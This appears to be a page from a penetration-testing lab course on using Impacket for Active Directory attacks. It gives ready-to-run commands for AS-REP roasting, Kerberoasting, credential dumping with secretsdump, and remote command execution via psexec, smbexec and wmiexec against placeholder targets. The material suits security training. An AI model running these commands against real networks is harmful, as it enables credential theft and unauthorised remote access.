# Lab 04: Impacket - AD Enumeration & Exploitation

[⬅️ Previous](Lab-03-Intermediate-Track-Responder.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-05-Advanced-Track-AD-Basics.md)

---

## 🎯 Lab Objective
Use Impacket tools for Active Directory enumeration and exploitation.

## 🌐 Direct Lab Access
- Impacket GitHub: https://github.com/SecureAuthCorp/impacket

---

## 🛠️ Installation
```bash
# Pre-installed on Kali/Parrot
impacket-GetNPUsers -h
```

---

## 📝 Impacket Tools

### 1. GetNPUsers (AS-REP Roasting)
```bash
impacket-GetNPUsers targetdomain.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 192.168.1.10
```

### 2. GetUserSPNs (Kerberoasting)
```bash
impacket-GetUserSPNs targetdomain.com/username:password -request -dc-ip 192.168.1.10 -outputfile hashes.txt
```

### 3. SecretsDump
```bash
impacket-secretsdump targetdomain.com/username:password@192.168.1.10
```

### 4. psexec
```bash
impacket-psexec targetdomain.com/username:password@192.168.1.10
```

### 5. smbexec
```bash
impacket-smbexec targetdomain.com/username:password@192.168.1.10
```

### 6. wmiexec
```bash
impacket-wmiexec targetdomain.com/username:password@192.168.1.10
```

---

## 🔗 Additional Resources
- Impacket Docs: https://github.com/SecureAuthCorp/impacket/tree/master/examples

---

[⬅️ Previous](Lab-03-Intermediate-Track-Responder.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-05-Advanced-Track-AD-Basics.md)
